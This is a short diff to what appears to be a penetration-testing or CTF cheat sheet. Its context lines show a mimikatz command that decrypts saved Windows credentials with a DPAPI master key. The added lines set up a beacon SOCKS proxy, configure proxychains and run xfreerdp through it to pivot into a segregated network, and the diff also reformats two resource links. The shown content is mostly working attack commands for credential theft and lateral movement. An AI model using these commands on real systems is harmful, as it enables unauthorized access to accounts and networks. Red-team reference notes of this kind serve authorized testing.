@@ -117,9 +117,17 @@ Obtain password
 mimikatz dpapi::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Credentials\<File Name from earlier command> /masterkey:<key from above command>
 ```
 
+**Proxychains & RDP:**
+
+```
+beacon> socks 1337
+nano /etc/proxychains.conf socks4 127.0.0.1 1337
+proxychains xfreerdp /u:<username> /v:<IPADDRESS> 
+```
+
 **Resources:**
 
-https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
+[https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/](https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/)
 
 [http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/](https://legacy.gitbook.com/book/d00mfist1/ctf/edit#)
 
